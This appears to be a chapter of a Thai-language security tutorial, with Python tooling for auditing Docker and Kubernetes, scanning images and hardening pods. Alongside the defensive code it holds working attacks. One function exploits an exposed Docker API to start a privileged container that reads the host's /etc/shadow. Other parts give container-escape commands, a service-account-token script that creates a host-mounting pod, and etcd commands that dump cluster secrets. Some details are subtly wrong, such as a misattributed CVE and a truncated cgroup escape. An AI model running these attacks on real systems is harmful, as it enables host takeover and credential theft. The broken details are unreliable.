# Part 59: Container & Kubernetes Security (Steps 581-590)

## Step 581: Docker Security Assessment

Docker security ครอบคลุมตั้งแต่การติดตั้งจนถึงการเชา daemon

```python
import subprocess
import json
import os
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import requests
import re

@dataclass
class DockerVulnerability:
    severity: str
    title: str
    description: str
    remediation: str
    cve: Optional[str] = None

class DockerSecurityAuditor:
    def check_docker_socket_exposure(self) -> List[DockerVulnerability]:
        """Check if Docker socket is exposed"""
        vulns = []
        
        # Check for Docker socket mount in containers
        result = subprocess.run(
            ['docker', 'ps', '-q'],
            capture_output=True, text=True
        )
        
        for container_id in result.stdout.strip().split('\n'):
            if not container_id:
                continue
            
            inspect = subprocess.run(
                ['docker', 'inspect', container_id],
                capture_output=True, text=True
            )
            
            if inspect.returncode == 0:
                data = json.loads(inspect.stdout)
                if data:
                    container = data[0]
                    
                    # Check mounts
                    for mount in container.get('Mounts', []):
                        if '/var/run/docker.sock' in mount.get('Source', ''):
                            vulns.append(DockerVulnerability(
                                severity="CRITICAL",
                                title="Docker Socket Mounted",
                                description=f"Container {container_id[:12]} has docker.sock mounted",
                                remediation="Remove docker.sock mount - allows container escape",
                                cve="CVE-2019-5736"
                            ))
                    
                    # Check privileged mode
                    if container.get('HostConfig', {}).get('Privileged', False):
                        vulns.append(DockerVulnerability(
                            severity="CRITICAL",
                            title="Privileged Container",
                            description=f"Container {container_id[:12]} runs as privileged",
                            remediation="Remove --privileged flag from container"
                        ))
                    
                    # Check user namespace
                    user = container.get('Config', {}).get('User', '')
                    if not user or user == 'root' or user == '0':
                        vulns.append(DockerVulnerability(
                            severity="HIGH",
                            title="Running as Root",
                            description=f"Container {container_id[:12]} runs as root",
                            remediation="Add USER directive in Dockerfile"
                        ))
                    
                    # Check capabilities
                    cap_add = container.get('HostConfig', {}).get('CapAdd', []) or []
                    dangerous_caps = ['SYS_ADMIN', 'NET_ADMIN', 'SYS_PTRACE', 'DAC_READ_SEARCH']
                    for cap in cap_add:
                        if cap in dangerous_caps:
                            vulns.append(DockerVulnerability(
                                severity="HIGH",
                                title=f"Dangerous Capability: {cap}",
                                description=f"Container {container_id[:12]} has {cap} capability",
                                remediation=f"Remove {cap} from container capabilities"
                            ))
        
        return vulns
    
    def check_docker_daemon_config(self) -> Dict:
        """Audit Docker daemon configuration"""
        config_paths = [
            '/etc/docker/daemon.json',
            '/root/.docker/daemon.json'
        ]
        
        issues = []
        config = {}
        
        for path in config_paths:
            if os.path.exists(path):
                with open(path) as f:
                    config = json.load(f)
                break
        
        # Check security settings
        if not config.get('userns-remap'):
            issues.append("User namespace remapping not enabled")
        
        if not config.get('no-new-privileges'):
            issues.append("no-new-privileges not set")
        
        if config.get('icc', True):  # Inter-container communication
            issues.append("Inter-container communication enabled (disable with --icc=false)")
        
        if not config.get('live-restore'):
            issues.append("live-restore not enabled")
        
        if not config.get('log-driver'):
            issues.append("Logging driver not configured")
        
        # Check for TLS
        if not config.get('tls') and not config.get('tlsverify'):
            issues.append("TLS not configured for Docker daemon")
        
        return {
            "config_file": config,
            "security_issues": issues,
            "recommendations": {
                "userns-remap": "Enable user namespace remapping",
                "no-new-privileges": "Set seccomp/apparmor profiles",
                "icc": "Disable inter-container communication",
                "tls": "Enable TLS for daemon API"
            }
        }
    
    def exploit_docker_api(self, target_ip: str, 
                            port: int = 2375) -> dict:
        """Exploit exposed Docker API (unauthenticated)"""
        base_url = f"http://{target_ip}:{port}"
        
        try:
            # List containers
            r = requests.get(f"{base_url}/containers/json", timeout=5)
            containers = r.json()
            
            # List images
            r2 = requests.get(f"{base_url}/images/json", timeout=5)
            images = r2.json()
            
            # Get system info
            r3 = requests.get(f"{base_url}/info", timeout=5)
            info = r3.json()
            
            print(f"[+] Docker API accessible at {base_url}")
            print(f"[+] Running containers: {len(containers)}")
            print(f"[+] Images: {len(images)}")
            print(f"[+] Docker version: {info.get('ServerVersion')}")
            print(f"[+] Host OS: {info.get('OperatingSystem')}")
            
            # Create container with host filesystem mount
            escape_payload = {
                "Image": "alpine",
                "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"],
                "HostConfig": {
                    "Binds": ["/:/mnt"],
                    "Privileged": True
                }
            }
            
            r4 = requests.post(
                f"{base_url}/containers/create?name=pentest_{target_ip.replace('.','_')}",
                json=escape_payload,
                timeout=10
            )
            
            if r4.status_code == 201:
                container_id = r4.json().get('Id')
                print(f"[+] Created escape container: {container_id[:12]}")
                
                # Start container
                requests.post(f"{base_url}/containers/{container_id}/start")
                
                # Get logs (command output)
                logs = requests.get(
                    f"{base_url}/containers/{container_id}/logs?stdout=1&stderr=1"
                )
                print(f"[+] Container output:\n{logs.text[:500]}")
                
                return {"compromised": True, "container_id": container_id}
            
        except Exception as e:
            print(f"[-] Docker API error: {e}")
        
        return {"compromised": False}
    
    def container_escape_techniques(self) -> Dict:
        """Container escape techniques reference"""
        return {
            "docker_socket": {
                "description": "Mounted docker.sock allows creating privileged containers",
                "exploit": """
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Or via socket:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -X POST --unix-socket /var/run/docker.sock \\
  -H 'Content-Type: application/json' \\
  http://localhost/containers/create \\
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'
                """
            },
            "privileged_container": {
                "description": "Privileged containers can access host devices",
                "exploit": """
# Inside privileged container:
fdisk -l  # Find host disk
mount /dev/sda1 /mnt  # Mount host filesystem
chroot /mnt  # Chroot to host
# Or use cgroup escape:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\\brelease_agent\\b.*//p' /tmp/cgrp/release_agent)" > /tmp/cgrp/release_agent
                """
            },
            "cve_2019_5736_runc": {
                "description": "runc container escape - overwrites host runc binary",
                "cve": "CVE-2019-5736",
                "conditions": "Old Docker/runc versions"
            },
            "namespace_escape": {
                "description": "Escape via PID namespace if SYS_PTRACE capability",
                "exploit": """
# If container has SYS_PTRACE:
cat /proc/1/status | grep NSpid  # Check if in host PID ns
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
                """
            }
        }

if __name__ == '__main__':
    auditor = DockerSecurityAuditor()
    
    # Audit running containers
    vulns = auditor.check_docker_socket_exposure()
    print(f"[*] Found {len(vulns)} Docker vulnerabilities")
    for vuln in vulns:
        print(f"  [{vuln.severity}] {vuln.title}: {vuln.description}")
    
    # Daemon config
    daemon_issues = auditor.check_docker_daemon_config()
    print(f"\n[*] Daemon issues: {daemon_issues['security_issues']}")
    
    # Escape techniques
    escapes = auditor.container_escape_techniques()
    print(f"\n[*] Container escape techniques: {list(escapes.keys())}")
```

## Step 582: Kubernetes Security Assessment

การ audit Kubernetes cluster หา misconfigurations และ privilege escalation paths

```python
import subprocess
import json
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class K8sVulnerability:
    resource_type: str
    resource_name: str
    namespace: str
    severity: str
    issue: str
    remediation: str

class KubernetesAuditor:
    def __init__(self, kubeconfig: str = None):
        self.kubectl_base = ['kubectl']
        if kubeconfig:
            self.kubectl_base.extend(['--kubeconfig', kubeconfig])
    
    def _run_kubectl(self, args: List[str]) -> dict:
        """Run kubectl command"""
        cmd = self.kubectl_base + args + ['-o', 'json']
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            try:
                return json.loads(result.stdout)
            except:
                return {"raw": result.stdout}
        return {"error": result.stderr}
    
    def find_privileged_pods(self) -> List[K8sVulnerability]:
        """Find pods with privileged security context"""
        vulns = []
        pods = self._run_kubectl(['get', 'pods', '--all-namespaces'])
        
        for pod in pods.get('items', []):
            name = pod['metadata']['name']
            ns = pod['metadata']['namespace']
            
            for container in pod.get('spec', {}).get('containers', []):
                sc = container.get('securityContext', {})
                
                if sc.get('privileged', False):
                    vulns.append(K8sVulnerability(
                        resource_type="Pod",
                        resource_name=name,
                        namespace=ns,
                        severity="CRITICAL",
                        issue=f"Container '{container['name']}' runs as privileged",
                        remediation="Set privileged: false in securityContext"
                    ))
                
                if sc.get('allowPrivilegeEscalation', True):
                    vulns.append(K8sVulnerability(
                        resource_type="Pod",
                        resource_name=name,
                        namespace=ns,
                        severity="HIGH",
                        issue=f"Container '{container['name']}' allows privilege escalation",
                        remediation="Set allowPrivilegeEscalation: false"
                    ))
                
                # Check dangerous volume mounts
                for vm in container.get('volumeMounts', []):
                    if '/var/run/docker.sock' in vm.get('mountPath', ''):
                        vulns.append(K8sVulnerability(
                            resource_type="Pod",
                            resource_name=name,
                            namespace=ns,
                            severity="CRITICAL",
                            issue="Docker socket mounted in container",
                            remediation="Remove docker.sock volume mount"
                        ))
        
        return vulns
    
    def check_rbac_misconfigurations(self) -> List[K8sVulnerability]:
        """Check RBAC for overly permissive configurations"""
        vulns = []
        
        # Check ClusterRoleBindings
        crbs = self._run_kubectl(['get', 'clusterrolebindings'])
        
        for crb in crbs.get('items', []):
            name = crb['metadata']['name']
            role_ref = crb.get('roleRef', {})
            subjects = crb.get('subjects', [])
            
            # Check for cluster-admin binding to service accounts
            if role_ref.get('name') == 'cluster-admin':
                for subject in subjects:
                    if subject.get('kind') == 'ServiceAccount':
                        vulns.append(K8sVulnerability(
                            resource_type="ClusterRoleBinding",
                            resource_name=name,
                            namespace=subject.get('namespace', 'cluster-wide'),
                            severity="CRITICAL",
                            issue=f"ServiceAccount '{subject['name']}' has cluster-admin",
                            remediation="Use least privilege RBAC"
                        ))
                    
                    elif subject.get('kind') == 'User' and subject.get('name') == 'system:anonymous':
                        vulns.append(K8sVulnerability(
                            resource_type="ClusterRoleBinding",
                            resource_name=name,
                            namespace="cluster-wide",
                            severity="CRITICAL",
                            issue="Anonymous user has cluster-admin privileges",
                            remediation="Remove anonymous user bindings"
                        ))
        
        # Check for wildcards in roles
        roles = self._run_kubectl(['get', 'clusterroles'])
        for role in roles.get('items', []):
            role_name = role['metadata']['name']
            for rule in role.get('rules', []):
                if '*' in rule.get('verbs', []) and '*' in rule.get('resources', []):
                    vulns.append(K8sVulnerability(
                        resource_type="ClusterRole",
                        resource_name=role_name,
                        namespace="cluster-wide",
                        severity="HIGH",
                        issue="Role has wildcard permissions on all resources",
                        remediation="Restrict to specific verbs and resources"
                    ))
        
        return vulns
    
    def find_exposed_secrets(self) -> List[dict]:
        """Find secrets in environment variables and mounted files"""
        exposed = []
        pods = self._run_kubectl(['get', 'pods', '--all-namespaces'])
        
        sensitive_patterns = [
            'password', 'secret', 'token', 'api_key', 'credentials',
            'private_key', 'auth', 'passwd', 'pwd'
        ]
        
        for pod in pods.get('items', []):
            name = pod['metadata']['name']
            ns = pod['metadata']['namespace']
            
            for container in pod.get('spec', {}).get('containers', []):
                for env_var in container.get('env', []):
                    env_name = env_var.get('name', '').lower()
                    if any(p in env_name for p in sensitive_patterns):
                        value = env_var.get('value', 'FROM_SECRET')
                        exposed.append({
                            "pod": name,
                            "namespace": ns,
                            "container": container['name'],
                            "env_var": env_var['name'],
                            "value": value[:20] + '...' if len(value) > 20 else value
                        })
        
        return exposed
    
    def check_network_policies(self) -> dict:
        """Check if NetworkPolicies are configured"""
        # Get all namespaces
        ns_list = self._run_kubectl(['get', 'namespaces'])
        
        unprotected_ns = []
        for ns in ns_list.get('items', []):
            ns_name = ns['metadata']['name']
            # Skip system namespaces
            if ns_name.startswith('kube-'):
                continue
            
            # Check if NetworkPolicy exists
            netpols = self._run_kubectl(['get', 'networkpolicies', '-n', ns_name])
            if not netpols.get('items'):
                unprotected_ns.append(ns_name)
        
        return {
            "unprotected_namespaces": unprotected_ns,
            "issue": f"{len(unprotected_ns)} namespaces have no NetworkPolicy",
            "risk": "Lateral movement between pods possible"
        }
    
    def exploit_service_account_token(self) -> str:
        """Exploit mounted service account token"""
        return """
# Inside pod, check for mounted service account token
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Read token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Find API server
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# List pods
curl -s $APISERVER/api/v1/namespaces/$NAMESPACE/pods \\
  --header "Authorization: Bearer $TOKEN" \\
  --cacert $CA_CERT

# Check what we can do
curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \\
  --header "Authorization: Bearer $TOKEN" \\
  --cacert $CA_CERT \\
  -X POST \\
  -H 'Content-Type: application/json' \\
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"resource":"pods","verb":"create","namespace":"default"}}}'

# If can create pods - create privileged pod to escape
curl -s $APISERVER/api/v1/namespaces/default/pods \\
  --header "Authorization: Bearer $TOKEN" \\
  --cacert $CA_CERT \\
  -X POST \\
  -H 'Content-Type: application/json' \\
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "containers": [{
        "name": "escape",
        "image": "alpine",
        "command": ["/bin/sh","-c","cat /mnt/etc/shadow"],
        "volumeMounts": [{"name": "host","mountPath": "/mnt"}]
      }],
      "volumes": [{"name": "host","hostPath": {"path": "/"}}]
    }
  }'
        """

if __name__ == '__main__':
    auditor = KubernetesAuditor()
    
    print("[*] Checking privileged pods...")
    priv_pods = auditor.find_privileged_pods()
    print(f"[+] Found {len(priv_pods)} privileged pod issues")
    
    print("\n[*] Checking RBAC...")
    rbac_issues = auditor.check_rbac_misconfigurations()
    print(f"[+] Found {len(rbac_issues)} RBAC issues")
    
    print("\n[*] Network policies...")
    netpol = auditor.check_network_policies()
    print(f"[+] {netpol['issue']}")
    
    print("\n[*] Service account token exploitation:")
    print(auditor.exploit_service_account_token()[:400])
```

## Step 583: Kubernetes Privilege Escalation

เทคนิค privilege escalation บน Kubernetes cluster

```python
import subprocess
import json
import requests
from typing import List, Dict

class K8sPrivEsc:
    def check_pod_exec_permissions(self, token: str, 
                                    api_server: str) -> List[dict]:
        """Check if we can exec into pods"""
        headers = {"Authorization": f"Bearer {token}"}
        findings = []
        
        # List all pods
        r = requests.get(
            f"{api_server}/api/v1/pods",
            headers=headers,
            verify=False
        )
        
        if r.status_code == 200:
            pods = r.json().get('items', [])
            
            for pod in pods:
                name = pod['metadata']['name']
                ns = pod['metadata']['namespace']
                
                # Check exec permission
                sar_payload = {
                    "apiVersion": "authorization.k8s.io/v1",
                    "kind": "SelfSubjectAccessReview",
                    "spec": {
                        "resourceAttributes": {
                            "namespace": ns,
                            "verb": "create",
                            "resource": "pods/exec"
                        }
                    }
                }
                
                sar_r = requests.post(
                    f"{api_server}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
                    json=sar_payload,
                    headers=headers,
                    verify=False
                )
                
                if sar_r.status_code == 201:
                    allowed = sar_r.json().get('status', {}).get('allowed', False)
                    if allowed:
                        findings.append({
                            "pod": name,
                            "namespace": ns,
                            "exec_allowed": True
                        })
        
        return findings
    
    def privesc_via_node_proxy(self, api_server: str, token: str) -> str:
        """Access kubelet via node proxy"""
        return f"""
# List nodes
kubectl get nodes

# Access kubelet API via node proxy (requires node/* permissions)
kubectl proxy --port=8001 &
curl http://localhost:8001/api/v1/nodes/<NODE_NAME>/proxy/pods

# Direct kubelet API (port 10250)
# If kubelet has anonymous auth enabled:
curl -sk https://<NODE_IP>:10250/pods
curl -sk https://<NODE_IP>:10250/run/default/<POD_NAME>/<CONTAINER_NAME> \\
  -d 'cmd=id'

# Via kubectl port-forward to access kubelet
kubectl get --raw "/api/v1/nodes/<NODE>/proxy/run/default/<POD>/<CONTAINER>" \\
  --data-urlencode 'cmd=id'
        """
    
    def privesc_etcd_access(self) -> str:
        """Access etcd directly to read secrets"""
        return """
# If etcd is accessible (usually port 2379-2380)
# Without auth:
etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix --keys-only
etcdctl --endpoints=http://127.0.0.1:2379 get /registry/secrets --prefix

# With cert auth:
etcdctl --endpoints=https://127.0.0.1:2379 \\
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\
  --cert=/etc/kubernetes/pki/etcd/server.crt \\
  --key=/etc/kubernetes/pki/etcd/server.key \\
  get /registry/secrets --prefix

# Decode base64 secrets
etcdctl get /registry/secrets/default/mysecret | base64 -d

# Extract all service account tokens
etcdctl get /registry/secrets --prefix | grep -A10 'ServiceAccountToken'
        """
    
    def find_attack_paths(self) -> List[dict]:
        """Common K8s privilege escalation paths"""
        return [
            {
                "path": "Service Account -> Cluster Admin",
                "condition": "Service account has cluster-admin ClusterRoleBinding",
                "exploit": "Use mounted token to call API with full privileges"
            },
            {
                "path": "Pod Create -> Node Root",
                "condition": "Can create pods in any namespace",
                "exploit": "Create pod with hostPID + privileged, run nsenter --target 1"
            },
            {
                "path": "Pod Exec -> Secret Access",
                "condition": "Can exec into pods with secrets mounted",
                "exploit": "kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"
            },
            {
                "path": "RBAC Write -> Add ClusterAdmin",
                "condition": "Can create ClusterRoleBindings",
                "exploit": "Bind own SA to cluster-admin role"
            },
            {
                "path": "Secrets Read -> DB Credentials",
                "condition": "Can list secrets across namespaces",
                "exploit": "kubectl get secrets --all-namespaces -o yaml"
            },
            {
                "path": "Node Access -> Container Runtime",
                "condition": "SSH access to worker node",
                "exploit": "crictl ps; crictl exec <container-id> /bin/sh"
            }
        ]
    
    def generate_kubesec_report(self, manifest_path: str) -> str:
        """Run kubesec for static analysis"""
        cmd = f"kubesec scan {manifest_path}"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        return result.stdout
    
    def run_kube_bench(self) -> str:
        """Run kube-bench CIS benchmark"""
        return """
# Install kube-bench
curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.7.0/kube-bench_0.7.0_linux_amd64.tar.gz | tar xz

# Run all checks
./kube-bench

# Run specific section
./kube-bench run --targets master  # Master node checks
./kube-bench run --targets node    # Worker node checks
./kube-bench run --targets etcd    # etcd checks

# Run with specific config
./kube-bench --config-dir ./cfg --config ./cfg/config.yaml

# JSON output for parsing
./kube-bench -o json > kube_bench_results.json
        """

if __name__ == '__main__':
    privesc = K8sPrivEsc()
    
    paths = privesc.find_attack_paths()
    print("[*] Kubernetes Attack Paths:")
    for path in paths:
        print(f"  Path: {path['path']}")
        print(f"  Condition: {path['condition']}")
        print(f"  Exploit: {path['exploit'][:60]}...")
        print()
```

## Step 584-590: Container Security Automation Suite

```python
import subprocess
import json
import os
import yaml
from dataclasses import dataclass, field
from typing import List, Dict, Optional

class ContainerSecuritySuite:
    def scan_image_with_trivy(self, image: str, 
                               format: str = "json") -> dict:
        """Scan container image with Trivy"""
        cmd = ['trivy', 'image', '--format', format, 
               '--severity', 'CRITICAL,HIGH', image]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0 and format == 'json':
            try:
                data = json.loads(result.stdout)
                vulns = []
                for r in data.get('Results', []):
                    for v in r.get('Vulnerabilities', []):
                        vulns.append({
                            "package": v.get('PkgName'),
                            "version": v.get('InstalledVersion'),
                            "cve": v.get('VulnerabilityID'),
                            "severity": v.get('Severity'),
                            "fixed_version": v.get('FixedVersion', 'N/A'),
                            "description": v.get('Description', '')[:100]
                        })
                return {"image": image, "vulnerabilities": vulns, "count": len(vulns)}
            except json.JSONDecodeError:
                return {"raw": result.stdout}
        
        return {"error": result.stderr, "returncode": result.returncode}
    
    def scan_dockerfile(self, dockerfile_path: str) -> List[dict]:
        """Static analysis of Dockerfile for security issues"""
        issues = []
        
        with open(dockerfile_path, 'r') as f:
            lines = f.readlines()
        
        for i, line in enumerate(lines, 1):
            line = line.strip()
            
            # Check for latest tag
            if line.startswith('FROM') and ':latest' in line:
                issues.append({
                    "line": i,
                    "severity": "MEDIUM",
                    "issue": "Using :latest tag",
                    "code": line,
                    "fix": "Use specific version tag"
                })
            
            # Check for running as root
            if line.startswith('USER root'):
                issues.append({
                    "line": i,
                    "severity": "HIGH",
                    "issue": "Explicitly setting USER root",
                    "code": line,
                    "fix": "Use non-root user"
                })
            
            # Check for secrets in ENV
            if line.startswith('ENV') and any(
                k in line.upper() for k in ['PASSWORD', 'SECRET', 'TOKEN', 'API_KEY', 'PRIVATE_KEY']
            ):
                issues.append({
                    "line": i,
                    "severity": "CRITICAL",
                    "issue": "Potential secret in ENV",
                    "code": line[:50],
                    "fix": "Use Docker secrets or environment injection at runtime"
                })
            
            # Check for COPY --chown root
            if 'curl' in line.lower() and '|' in line and 'bash' in line.lower():
                issues.append({
                    "line": i,
                    "severity": "HIGH",
                    "issue": "Curl-pipe-bash pattern",
                    "code": line[:50],
                    "fix": "Download and verify checksum separately"
                })
            
            # Check for privileged run
            if 'chmod 777' in line or 'chmod -R 777' in line:
                issues.append({
                    "line": i,
                    "severity": "MEDIUM",
                    "issue": "World-writable permissions",
                    "code": line,
                    "fix": "Use minimal permissions"
                })
            
            # ADD vs COPY (ADD can extract archives and fetch URLs)
            if line.startswith('ADD') and not line.startswith('ADDUSER'):
                issues.append({
                    "line": i,
                    "severity": "LOW",
                    "issue": "Using ADD instead of COPY",
                    "code": line,
                    "fix": "Use COPY for local files, ADD only for tar extraction"
                })
        
        return issues
    
    def check_container_runtime_security(self) -> dict:
        """Check container runtime security features"""
        checks = {}
        
        # Check AppArmor
        try:
            aa_status = subprocess.run(['aa-status'], capture_output=True, text=True)
            checks['apparmor'] = {
                'available': aa_status.returncode == 0,
                'profiles': aa_status.stdout.count('profile')
            }
        except FileNotFoundError:
            checks['apparmor'] = {'available': False}
        
        # Check Seccomp
        seccomp_path = '/proc/1/status'
        if os.path.exists(seccomp_path):
            with open(seccomp_path) as f:
                content = f.read()
            seccomp_mode = re.search(r'Seccomp:\s+(\d+)', content)
            checks['seccomp'] = {
                'available': True,
                'mode': int(seccomp_mode.group(1)) if seccomp_mode else 0
            }
        
        # Check gVisor
        try:
            runsc = subprocess.run(['runsc', 'version'], capture_output=True, text=True)
            checks['gvisor'] = {'available': runsc.returncode == 0}
        except FileNotFoundError:
            checks['gvisor'] = {'available': False}
        
        return checks
    
    def create_secure_pod_manifest(self, name: str, image: str,
                                    namespace: str = "default") -> dict:
        """Create security-hardened pod manifest"""
        return {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": name,
                "namespace": namespace,
                "labels": {"app": name}
            },
            "spec": {
                "securityContext": {
                    "runAsNonRoot": True,
                    "runAsUser": 1000,
                    "runAsGroup": 1000,
                    "fsGroup": 1000,
                    "seccompProfile": {"type": "RuntimeDefault"}
                },
                "containers": [{
                    "name": name,
                    "image": image,
                    "securityContext": {
                        "allowPrivilegeEscalation": False,
                        "privileged": False,
                        "readOnlyRootFilesystem": True,
                        "capabilities": {"drop": ["ALL"]}
                    },
                    "resources": {
                        "limits": {"cpu": "500m", "memory": "128Mi"},
                        "requests": {"cpu": "100m", "memory": "64Mi"}
                    },
                    "volumeMounts": [{
                        "name": "tmp",
                        "mountPath": "/tmp"
                    }]
                }],
                "volumes": [{
                    "name": "tmp",
                    "emptyDir": {}
                }],
                "automountServiceAccountToken": False
            }
        }
    
    def run_falco_detection(self) -> str:
        """Configure Falco for runtime security detection"""
        return """
# Install Falco
curl -fsSL https://falco.org/repo/falcosecurity-3672BA8F.asc | gpg --dearmor -o /usr/share/keyrings/falco.gpg
echo 'deb [signed-by=/usr/share/keyrings/falco.gpg] https://download.falco.org/packages/deb stable main' > /etc/apt/sources.list.d/falcosecurity.list
apt-get install -y falco

# Custom rules example
cat >> /etc/falco/falco_rules.local.yaml << 'EOF'
- rule: Detect Shell in Container
  desc: Shell opened in container
  condition: spawned_process and container and shell_procs
  output: Shell spawned in container (user=%user.name container=%container.name shell=%proc.name)
  priority: WARNING

- rule: Detect Privilege Escalation  
  desc: Process running as root in container
  condition: spawned_process and container and proc.uid=0 and not container_entrypoint
  output: Root process in container (user=%user.name command=%proc.cmdline container=%container.name)
  priority: ERROR

- rule: Detect Sensitive File Access
  desc: Access to sensitive files
  condition: open_read and container and sensitive_files
  output: Sensitive file opened (file=%fd.name command=%proc.cmdline container=%container.name)
  priority: WARNING
EOF

# Start Falco
falco --daemon

# View alerts
tail -f /var/log/falco.log
        """
    
    def network_policy_generator(self, app_name: str, 
                                   allowed_ingress_ports: List[int],
                                   allowed_egress: List[dict]) -> dict:
        """Generate Kubernetes NetworkPolicy"""
        ingress_rules = []
        for port in allowed_ingress_ports:
            ingress_rules.append({
                "ports": [{"protocol": "TCP", "port": port}]
            })
        
        egress_rules = []
        for eg in allowed_egress:
            rule = {"ports": [{"protocol": "TCP", "port": eg["port"]}]}
            if "cidr" in eg:
                rule["to"] = [{"ipBlock": {"cidr": eg["cidr"]}}]
            egress_rules.append(rule)
        
        return {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "NetworkPolicy",
            "metadata": {"name": f"{app_name}-netpol"},
            "spec": {
                "podSelector": {"matchLabels": {"app": app_name}},
                "policyTypes": ["Ingress", "Egress"],
                "ingress": ingress_rules,
                "egress": egress_rules
            }
        }

if __name__ == '__main__':
    suite = ContainerSecuritySuite()
    
    # Scan image
    print("[*] Example: trivy image scan")
    print("    Command: trivy image --severity CRITICAL,HIGH python:3.9")
    
    # Create secure pod manifest
    manifest = suite.create_secure_pod_manifest("secure-app", "nginx:1.25")
    print(f"\n[*] Secure pod manifest:")
    print(yaml.dump(manifest, default_flow_style=False)[:400])
    
    # Network policy
    netpol = suite.network_policy_generator(
        "myapp",
        allowed_ingress_ports=[8080],
        allowed_egress=[{"port": 443, "cidr": "0.0.0.0/0"}]
    )
    print(f"\n[*] NetworkPolicy for myapp:")
    print(yaml.dump(netpol, default_flow_style=False)[:400])
```
